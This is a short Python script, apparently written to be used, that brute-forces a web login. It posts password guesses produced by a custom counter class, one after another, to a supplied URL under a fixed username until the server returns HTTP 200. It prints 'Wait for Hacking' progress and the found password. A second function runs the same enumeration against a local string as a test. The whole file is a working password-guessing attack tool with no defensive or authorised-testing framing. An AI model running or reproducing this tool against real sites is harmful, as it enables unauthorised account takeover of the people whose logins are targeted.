from customNumb import CryptoNumber
import sys
import requests


def solveAccount(url="",head="",minChar="0"):
    if(url==""):
        return 

    counter=0
    cryptoNumber=CryptoNumber(decimal=63**((int(minChar)-1)))
    session=requests.session()
    while(True):
        counter+=1
        data={"username":head,"password":cryptoNumber.getValue(),"rememberme":True,"passwordonly":False}
        res=session.post(url,data=data)
        sys.stdout.write("\r Wait for Hacking : {} possible tried".format(counter)+" . Current : {}".format(cryptoNumber.getValue())+" . Response Code : {}".format(res.status_code))
        sys.stdout.flush()
        if(res.status_code==200):
            print("şifre bulundu")
            print(cryptoNumber.getValue())
            
            break
        else:
            cryptoNumber.add()
    

def solveTest(head="",minChar="0"):
    if(head==""):
        return 

    point=". "
    counter=0
    
    cryptoNumber=CryptoNumber(decimal=63**((int(minChar)-1)))
    print("  Start Value : " + str(cryptoNumber.getValue()))
    
    while(True):
        counter+=1
        sys.stdout.write("\r Wait for Hacking : {} possible tried".format(counter))
        sys.stdout.flush()
        if(head==cryptoNumber.getValue()):
            print("\n")
            return cryptoNumber.getValue()
            break
        else:
            cryptoNumber.add()
    
    return None